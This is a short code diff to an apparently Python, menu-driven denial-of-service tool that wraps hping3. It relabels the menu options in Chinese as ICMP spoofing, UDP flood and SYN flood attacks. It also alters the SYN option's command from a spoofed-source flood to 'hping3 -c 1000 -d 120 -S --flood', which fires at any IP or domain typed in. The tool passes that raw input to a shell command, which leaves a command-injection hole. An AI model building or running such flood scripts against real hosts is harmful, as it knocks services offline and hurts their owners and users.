@@ -24,9 +24,9 @@ while (True):
     print("""
 	\033[1;94m
 	1- Install hping3
-	2- Launch DoS attack whit hping3
-        3- udp
-        4- SYN
+	2- 带伪装的icmp欺骗
+    3- UDP洪水攻击
+    4- SYN洪水攻击
 	5- Exit
 	\033[1;m
 	""")
@@ -47,7 +47,7 @@ while (True):
         subprocess.call(ping + ip, shell=True)
     elif op == '4':
         ip = input('\033[1;91mGive me a ip or domain: \033[1;m')
-        ping = ('hping3 -S -a \'8.8.8.8\' -e \'fsociety\' --flood ')
+        ping = ('hping3 -c 1000 -d 120 -S --flood ')
         subprocess.call(ping + ip, shell=True)
 
     elif op == '5':
